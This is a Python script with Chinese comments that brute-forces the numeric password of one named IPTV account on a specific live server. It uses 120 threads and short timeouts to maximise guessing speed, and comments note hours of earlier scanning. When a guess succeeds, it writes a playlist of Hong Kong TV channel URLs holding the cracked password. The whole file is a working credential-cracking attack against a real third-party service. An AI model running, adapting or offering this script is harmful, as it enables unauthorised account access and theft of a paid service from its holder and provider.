import requests
import concurrent.futures

# --- 核心配置 ---
MEMBER_ID = "97776739" 
SERVER = "iptvpro.pw:35451"
TEST_CH = "3.ts" 

def verify_play(pwd_val):
    """暴力验证：同时尝试 8 位和 10 位补全，且必须验证真实视频流"""
    pwd_str = str(pwd_val)
    # 优先尝试 8 位，再尝试 10 位（参考你给的过账号）
    for length in [8, 10]:
        test_pwd = pwd_str.zfill(length)
        url = f"http://{SERVER}/live/{MEMBER_ID}/{test_pwd}/{TEST_CH}"
        try:
            # 缩短超时时间到 1.0s，极大提升撞库频率
            with requests.get(url, stream=True, timeout=1.0) as r:
                if r.status_code == 200:
                    # 读取前 1KB，确认有真实播放量
                    if next(r.iter_content(chunk_size=1024)):
                        return test_pwd
        except:
            continue
    return None

def main():
    print(f"正在对账号 {MEMBER_ID} 启动『9字头』精准暴力破解...")
    
    # 【关键修改】：直接从 9500 万开始，避开之前 6 小时扫过的无效区域
    # 这样能覆盖 9500xxxx 和 9500xxxxxx (10位) 的所有可能
    SCAN_RANGE = range(95000000, 99999999) 

    found = None
    # 120 线程暴力全开
    with concurrent.futures.ThreadPoolExecutor(max_workers=120) as executor:
        batch_size = 5000
        for i in range(SCAN_RANGE.start, SCAN_RANGE.stop, batch_size):
            batch = range(i, min(i + batch_size, SCAN_RANGE.stop))
            futures = {executor.submit(verify_play, p): p for p in batch}
            
            for future in concurrent.futures.as_completed(futures):
                res = future.result()
                if res:
                    found = res
                    break
            if found: break
            # 每 5000 次尝试打印一次进度，方便你在日志里查看
            print(f"当前进度：已尝试至数字 {i}")

    if found:
        print(f"!!! 恭喜！破解成功 !!! 密码是: {found}")
        out = [
            "破解有效源,#genre#",
            f"无线新闻,http://{SERVER}/live/{MEMBER_ID}/{found}/3.ts",
            f"翡翠台,http://{SERVER}/live/{MEMBER_ID}/{found}/1.ts",
            f"凤凰香港,http://{SERVER}/live/{MEMBER_ID}/{found}/5.ts"
        ]
        with open("config_v2.txt", "w", encoding="utf-8") as f:
            f.write("\n".join(out))
    else:
        print("该区间未发现有效密码。")

if __name__ == "__main__":
    main()
